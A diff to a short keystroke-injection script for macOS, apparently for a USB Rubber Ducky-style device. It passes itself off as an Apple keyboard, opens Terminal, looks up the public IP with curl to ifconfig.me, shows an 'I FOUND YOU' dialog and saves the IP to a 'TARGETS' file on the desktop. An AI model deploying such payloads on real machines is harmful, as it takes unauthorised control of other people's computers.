@@ -1,12 +1,14 @@
+REM Description: Uses Mac Terminals config.me command to do a PUBLIC I.P. lookup 
+REM displays the results in a pop up window 
+REM & Saves the data to a folder on the desktop
+REM Folder is named "Public I.P. Data"
+
+
 REM Title: Public I.P. Finder
 REM Author: Narsty
-REM Description: Uses Mac Terminals config.me command to do a PUBLIC I.P. lookup 
-REM displays the results in a pop up window & Saves the data to a folder on the desktop
-REM Folder is named "Public I.P. Data"
 REM Target: MacOS 
 REM Version: 1.0
 REM Category: Execution
-
 
 ID 05ac:021e Apple:Keyboard
 DELAY 500
@@ -21,8 +23,7 @@ ENTER
 DELAY 500
 STRING public_ip=$(curl -s ifconfig.me); osascript -e "tell app \"System Events\" to display dialog \"I FOUND YOU: $public_ip\" with title \"Public IP Address\""
 DELAY 500
-STRING && mkdir ~/Desktop/"Public I.P. Data" && echo "Your TARGETS IP address is: $public_ip" > ~/Desktop/"Public I.P. Data"/public_ip.txt
+STRING mkdir ~/Desktop/"Public I.P. Data" && echo "Your TARGETS IP address is: $public_ip" > ~/Desktop/"Public I.P. Data"/public_ip.txt
 DELAY 500
 ENTER
-
 
